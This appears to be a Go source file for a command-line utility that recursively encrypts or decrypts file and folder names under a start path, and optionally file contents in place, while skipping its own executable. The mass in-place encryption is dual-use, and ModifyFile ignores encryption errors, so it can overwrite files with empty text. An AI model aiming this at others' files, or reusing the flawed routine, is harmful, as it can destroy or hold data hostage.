package main

import (
	"bytes"
	"errors"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"./constant"
	"./helpers"
	"github.com/fatih/color"
)

// FilePath FilePath
type FilePath struct {
	FileName   string // last argument in filepath.
	Prefix     string // filepath excluding the last argument(FileName)
	EntirePath string // entire filepath.(= Prefix + FileName)
	IsDir      bool
	Depth      int // the number of recursions have been executed since the first ReadDirRec calling.
}

// Encrypter Encrypter
type Encrypter struct {
	ExcludeExt []string
	FilePaths  []*FilePath
	MODE       string
	MyName     string
	OnFile     bool
	Key        []byte
}

func (r Encrypter) Len() int           { return len(r.FilePaths) }
func (r Encrypter) Less(i, j int) bool { return r.FilePaths[i].Depth > r.FilePaths[j].Depth }
func (r Encrypter) Swap(i, j int)      { r.FilePaths[i], r.FilePaths[j] = r.FilePaths[j], r.FilePaths[i] }

// ReadFiles wrapper for ReadDirRec and Sort
func (r *Encrypter) ReadFiles() error {
	err := r.ReadDirRec(startPath, 0)
	if err != nil {
		return err
	}
	/* NOTE:
	Sort sorts acquired paths by it's depth in DESC order.
	Without this, it's impossible to change directory name.
	When try to change child path name, it may not exist if it's parent directory name was changed before.
	So make sure encrypt children files first, and then change it's directory name then.
	*/
	r.Sort() // <- Must be executed before encryption.

	return nil
}

// Sort sorts the filepaths by it's depth.
func (r *Encrypter) Sort() {
	sort.Sort(r)
}

// ReadDirRec reads files recursively.
func (r *Encrypter) ReadDirRec(prefix string, depth int) error {
	files, err := ioutil.ReadDir(prefix)
	if err != nil {
		return err
	}

	for _, f := range files {
		filePath := new(FilePath)
		filePath.FileName = f.Name()
		filePath.Prefix = prefix
		filePath.EntirePath = prefix + f.Name()
		filePath.Depth = depth

		if f.IsDir() {
			filePath.IsDir = true
		} else {
			filePath.IsDir = false
		}

		r.FilePaths = append(r.FilePaths, filePath)

		if f.IsDir() {
			r.ReadDirRec(filePath.EntirePath+"/", depth+1)
		}
	}

	return nil
}

// Encrypt Encrypt
func (r *Encrypter) Encrypt(onFile bool) (success int, fail int, err error) {
	errCount := 0
	for _, path := range r.FilePaths {

		if r.exclude(path.FileName) {
			continue
		}

		modifiedName, err := r.makeNewName(path.FileName)
		if err != nil {
			errCount++
			continue
		}

		dir := filepath.Dir(path.EntirePath)
		base := filepath.Base(path.EntirePath)
		oldPath := filepath.Join(dir, base)
		newPath := filepath.Join(dir, strings.Replace(base, path.FileName, modifiedName, 1))

		oldAbs, _ := filepath.Abs(oldPath)
		newAbs, _ := filepath.Abs(newPath)

		err = os.Rename(oldAbs, newAbs)
		if err != nil {
			helpers.Error(err)
			fail++
			continue
		}

		if onFile {
			err = r.ModifyFile(newAbs)
			if err != nil {
				helpers.Error(err)
				fail++
				continue
			}
		}

		success++

		helpers.Printf(color.FgHiBlue, "OLD: %s\n", oldAbs)
		helpers.Printf(color.FgHiGreen, "NEW: %s\n\n", newAbs)
	}

	return success, fail, nil
}

func (r *Encrypter) ModifyFile(path string) error {
	var newtext string
	oldtext, err := ioutil.ReadFile(path)
	if err != nil {
		helpers.Error(err)
		return err
	}

	text := string(oldtext)

	if r.MODE == constant.ENCRYPT {
		newtext, err = helpers.Encrypt(r.Key, text)
	} else if r.MODE == constant.DECRYPT {
		newtext, err = helpers.Decrypt(r.Key, text)
	}

	f, err := os.Create(path)
	if err != nil {
		helpers.Error(err)
		return err
	}

	_, err = io.Copy(f, bytes.NewReader([]byte(newtext)))
	if err != nil {
		helpers.Error(err)
		return err
	}

	return nil
}

func (r *Encrypter) makeNewName(filename string) (modifiedName string, err error) {
	if r.MODE == constant.ENCRYPT {
		modifiedName, err = helpers.Encrypt(r.Key, filename)
		if err != nil {
			return "", err
		}
	} else if r.MODE == constant.DECRYPT {
		modifiedName, err = helpers.Decrypt(r.Key, filename)
		if err != nil {
			return "", err
		}
	} else {
		return "", errors.New("Encrypt mode is not set")
	}
	return modifiedName, nil
}

func (r *Encrypter) exclude(target string) bool {
	if target == r.MyName ||
		"./"+target == r.MyName || // for linux
		target == r.MyName+".exe" ||
		target == r.MyName+".bat" {
		return true
	}
	return false
}
